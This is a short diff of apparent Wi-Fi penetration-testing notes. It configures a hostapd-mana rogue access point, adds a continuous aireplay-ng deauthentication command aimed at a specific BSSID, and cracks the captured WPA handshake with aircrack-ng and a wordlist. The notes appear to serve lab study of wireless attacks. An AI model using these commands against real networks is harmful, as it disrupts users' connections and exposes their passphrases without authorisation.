@@ -6,10 +6,10 @@ Simple hostapd-mana.conf - WPA-PSK
   interface=wlan0mon
   ssid=Mostar
   channel=1
-
-Default runs in 802.11b. May need to add the following:
   hw_mode=g
   ieee80211n=1
+
+Default runs in 802.11b. May need to add the following:
   wpa=3
   wpa_key_mgmt=WPA-PSK
   wpa_passphrase=ANYPASSWORD
@@ -20,6 +20,7 @@ Default runs in 802.11b. May need to add the following:
 *** Capturing Handshakes ***
 $sudo hostapd-mana Mostar-mana.conf
 Then deauth with aireplay
+$sudo aireplay-ng -0 0 -a FC:7A:2B:88:63:EF wlan1mon
 Captured handshake written to hccapx > hashcat or aircrack
 $aircrack-ng mostar.hccapx -e Mostar -w /usr/share/john/password.lst
 
